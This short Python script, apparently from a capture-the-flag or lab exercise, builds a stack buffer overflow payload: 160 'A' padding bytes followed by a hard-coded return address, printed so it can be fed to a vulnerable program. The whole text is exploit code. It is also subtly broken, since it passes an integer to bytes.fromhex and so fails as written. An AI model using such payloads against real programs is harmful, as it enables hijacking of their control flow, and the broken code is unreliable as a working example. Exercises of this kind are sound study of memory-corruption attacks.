s = 'A' * 160
retaddr = 86850408
s += bytes.fromhex(retaddr).decode("ascii")
print(s)
